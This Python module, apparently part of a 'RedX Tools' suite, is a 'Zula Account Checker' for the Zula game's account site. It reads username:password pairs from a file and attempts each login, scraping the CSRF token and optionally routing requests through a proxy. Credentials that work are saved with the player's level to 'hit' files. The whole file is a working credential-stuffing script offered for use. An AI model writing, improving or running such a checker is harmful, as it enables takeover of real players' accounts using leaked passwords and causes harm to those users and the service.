import requests
import re
import os
import sys
from colorama import Fore, Style
from datetime import datetime
import tkinter as tk
from tkinter import filedialog
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from results_organizer import ResultsOrganizer

import modules.rpc_manager as rpc_manager
rpc_manager.set_details("Zula Checker")

class ZulaChecker:
    def __init__(self, parent):
        self.parent = parent
        self.results_organizer = ResultsOrganizer()
        self.session_start_time = None
        
    def show_interface(self):
        self.parent.clear_screen()
        banner = f"""
{Fore.BLUE}╔══════════════════════════════════════════════════════════════════════════════════╗
{Fore.BLUE}║                                                                                  ║
{Fore.BLUE}║  {Fore.RED:<28}███████╗██╗   ██╗██╗      █████╗  {Fore.BLUE:<28}║
{Fore.BLUE}║  {Fore.RED:<28}╚══███╔╝██║   ██║██║     ██╔══██╗ {Fore.BLUE:<28}║
{Fore.BLUE}║  {Fore.RED:<28}  ███╔╝ ██║   ██║██║     ███████║ {Fore.BLUE:<28}║
{Fore.BLUE}║  {Fore.RED:<28} ███╔╝  ██║   ██║██║     ██╔══██║ {Fore.BLUE:<28}║
{Fore.BLUE}║  {Fore.RED:<28}███████╗╚██████╔╝███████╗██║  ██║ {Fore.BLUE:<28}║
{Fore.BLUE}║  {Fore.RED:<28}╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ {Fore.BLUE:<28}║
{Fore.BLUE}║                                                                                  ║
{Fore.BLUE}║  {Fore.RED:<15}╔═══════════════════════════════════════════════════════════╗{Fore.BLUE}         ║
{Fore.BLUE}║  {Fore.RED:<15}║{Fore.GREEN}    RedX Tools - Zula Account Checker                      {Fore.RED}║         {Fore.BLUE}║
{Fore.BLUE}║  {Fore.RED:<15}╚═══════════════════════════════════════════════════════════╝{Fore.BLUE}         ║
{Fore.BLUE}║                                                                                  ║
{Fore.BLUE}╚══════════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)

    def format_proxy(self, proxy):
        parts = proxy.split(":")
        if len(parts) == 2:
            return f"http://{proxy}"
        elif len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            print("Error: Invalid proxy address format.")
            return None

    def get_proxy(self):
        use_proxy = input("Do you want to use proxy? (Yes/No): ").lower()
        if use_proxy == "yes":
            proxy_str = input("Enter proxy information (host:port:username:password): ")
            return self.format_proxy(proxy_str)
        else:
            return None

    def read_credentials_from_file(self, filename):
        credentials = []
        try:
            with open(filename, "r", encoding="utf-8") as file:
                for line in file:
                    line = line.strip()
                    if ":" in line:
                        username, password = line.split(":")
                        credentials.append((username, password))
        except FileNotFoundError:
            print(f"{filename} file not found. Please check if the file exists.")
        return credentials

    def create_files(self):
        files_to_create = ["accounts.txt", "valid_accounts.txt"]
        
        for file in files_to_create:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write("")
                print(f"{Fore.GREEN}✓ Created {file}")

    def run(self):
        while True:
            self.show_interface()
            print("Don't forget to create accounts.txt file in the folder!")
            choice = input("Press 1 to continue, Q to exit: ")
            if choice.lower() == 'q':
                break

            self.session_start_time = datetime.now()

            self.create_files()

            headers = {
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'Referer': 'https://hesap.zulaoyun.com/',
                'sec-ch-ua-mobile': '?0',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
            }

            proxy = self.get_proxy()
            proxies = {"http": proxy, "https": proxy} if proxy else None

            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            print(f"{Fore.YELLOW}Select accounts file (accounts.txt):{Style.RESET_ALL}")
            accounts_file = filedialog.askopenfilename(
                title="Select Accounts File",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
                initialfile="accounts.txt"
            )
            
            root.destroy()
            
            if not accounts_file:
                print(f"{Fore.YELLOW}No file selected. Using default: accounts.txt{Style.RESET_ALL}")
                accounts_file = "accounts.txt"
            
            credentials = self.read_credentials_from_file(accounts_file)
            if not credentials:
                continue

            total_checked = 0
            valid_accounts = 0
            invalid_accounts = 0

            print(f"\n{Fore.CYAN}Starting Zula account checking...{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Total accounts to check: {len(credentials)}{Style.RESET_ALL}\n")

            for username, password in credentials:
                total_checked += 1
                print(f"{Fore.CYAN}[{total_checked}/{len(credentials)}] Checking: {username}{Style.RESET_ALL}")
                
                client = requests.Session()
                while True:
                    response = client.get('https://hesap.zulaoyun.com/', headers=headers, proxies=proxies)
                    response_text = response.text

                    right_string_token = 'name="__RequestVerificationToken" type="hidden" value="'
                    left_string_token = '"'
                    start_index_token = response_text.find(right_string_token)
                    if start_index_token != -1:
                        start_index_token += len(right_string_token)
                        end_index_token = response_text.find(left_string_token, start_index_token)
                        token = response_text[start_index_token:end_index_token]
                        print("Token:", token)
                    else:
                        token = None

                    if token:
                        data = {
                            '__RequestVerificationToken': token,
                            'ReturnUrl': '/',
                            'UserName': username,
                            'Password': password,
                            'RememberMe': 'false',
                        }

                        try:
                            response_login = client.post('https://hesap.zulaoyun.com/zula-giris-yap', headers=headers, data=data, proxies=proxies)
                            response_text_login = response_login.text

                            if "Token eksik" in response_text_login:
                                print("Token missing, retry.")
                            elif "Kullanıcı adı ya da şifre yanlış." in response_text_login:
                                print(f"{Fore.RED}[-] Invalid username or password: {username}{Style.RESET_ALL}")
                                invalid_accounts += 1
                                break
                            elif "PROFİL" in response_text_login:
                                print(f"{Fore.GREEN}[+] Successful login: Username: {username}, Password: {password}{Style.RESET_ALL}")
                                valid_accounts += 1

                                response_profil = client.get('https://hesap.zulaoyun.com/profile', headers=headers, proxies=proxies)
                                response_text_profil = response_profil.text

                                match_level = re.search(r'UserGameLevel\':"(.*?)"', response_text_profil)
                                if match_level:
                                    level = match_level.group(1)
                                    print(f"Level: {level}")

                                    hit_data = f"{username}:{password}|Level: {level}"
                                    self.results_organizer.save_hit("Zula Checker", hit_data, self.session_start_time)

                                    with open("valid_accounts.txt", "a", encoding="utf-8") as file:
                                        file.write(f"Username: {username}, Password: {password}, Level: {level}\n")
                                else:
                                    print("Level not found")
                                break
                            else:
                                print("Error occurred")
                                invalid_accounts += 1
                                break
                        except requests.RequestException as e:
                            print(f"An error occurred: {e}")
                            invalid_accounts += 1
                            break
                    else:
                        print("Token missing, retry.")

            stats = {
                'total_checked': total_checked,
                'valid_accounts': valid_accounts,
                'invalid_accounts': invalid_accounts,
                'success_rate': (valid_accounts / total_checked * 100) if total_checked > 0 else 0,
                'proxy_enabled': proxy is not None
            }
            self.results_organizer.save_stats("Zula Checker", stats, self.session_start_time)

            print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════════════════════════╗")
            print(f"║                         {Fore.YELLOW}CHECK COMPLETED!{Fore.GREEN}                                       ║")
            print(f"╠════════════════════════════════════════════════════════════════════════════════╣")
            print(f"║  {Fore.GREEN}[+] Valid:{Fore.WHITE} {valid_accounts:<67}{Fore.GREEN}║")
            print(f"║  {Fore.RED}[-] Invalid:{Fore.WHITE} {invalid_accounts:<65}{Fore.GREEN}║")
            print(f"║  {Fore.YELLOW}[*] Total:{Fore.WHITE} {total_checked:<67}{Fore.GREEN}║")
            print(f"║  {Fore.CYAN}[📁] Results saved to: results/Zula Checker/{self.session_start_time.strftime('%Y-%m-%d_%H-%M-%S')}/{' ' * (24)}{Fore.GREEN}║")
            print(f"╚════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            
            print(f"\n{Fore.GREEN}Valid accounts saved to: valid_accounts.txt{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Results also saved to: results/Zula Checker/{self.session_start_time.strftime('%Y-%m-%d_%H-%M-%S')}/hit.txt{Style.RESET_ALL}")
